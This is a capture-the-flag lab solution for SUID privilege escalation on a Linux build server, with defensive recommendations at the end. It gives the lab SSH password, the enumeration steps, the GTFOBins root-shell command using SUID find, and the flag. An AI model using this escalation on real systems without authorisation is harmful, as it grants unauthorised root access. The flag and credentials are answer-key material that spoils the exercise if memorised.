# Meridian Data Corp: SUID Privilege Escalation

## Overview

Students perform local privilege escalation on a Linux build server. The `find` binary has been misconfigured with the SUID bit set, allowing any user to execute commands as root via GTFOBins techniques. Students enumerate the system, identify the misconfiguration, and escalate to root to read the flag.

## Architecture

```
┌─────────────┐                     ┌──────────────┐
│   Student    │ ──── SSH:22 ─────▶ │    target     │
│   (Kali VM)  │                    │ (build server)│
└─────────────┘                     └──────────────┘
                                     User: developer
                                     Goal: root
```

## Solution Walkthrough

### Step 1: Connect to the Target

```bash
ssh developer@<target_ip>
# Password: M3r1d1an_D3v#
```

### Step 2: Basic Enumeration

```bash
whoami          # developer
id              # uid=1000(developer) gid=1000(developer)
sudo -l         # Can run /usr/local/bin/statuscheck (red herring)
```

### Step 3: Find SUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

Output includes:
```
/usr/bin/find        ← ABNORMAL! Not a standard SUID binary
/usr/bin/passwd      ← Normal
/usr/bin/su          ← Normal
/usr/bin/sudo        ← Normal
/usr/local/bin/statuscheck  ← Custom, but not exploitable
```

### Step 4: Exploit SUID find

Using the GTFOBins technique for `find`:

```bash
find . -exec /bin/sh -p \; -quit
```

This spawns a shell with effective UID 0 (root).

### Step 5: Read the Flag

```bash
whoami       # root
cat /root/flag.txt
# OCR{su1d_pr1v3sc_r00t3d}
```

## Common Mistakes

- **Ignoring find in the SUID list.** Students may dismiss `find` because it's a standard utility. The key insight is that `find` should NOT normally have SUID set.
- **Trying to exploit statuscheck.** It's a simple bash script; no path to escalation there.
- **Forgetting -p flag.** Without `-p`, bash drops SUID privileges. Using `/bin/sh` (dash on Ubuntu) avoids this issue.
- **Not using `-quit`.** Without `-quit`, find spawns a new shell for every file in the directory.

## Defensive Recommendations

- Audit SUID binaries regularly: `find / -perm -4000 -type f 2>/dev/null`
- Never set SUID on utilities like `find`, `vim`, `python`, `nmap`, or `less`: they all have shell escape paths
- Use `sudo` with specific command restrictions instead of SUID
- Implement file integrity monitoring to detect unauthorized permission changes
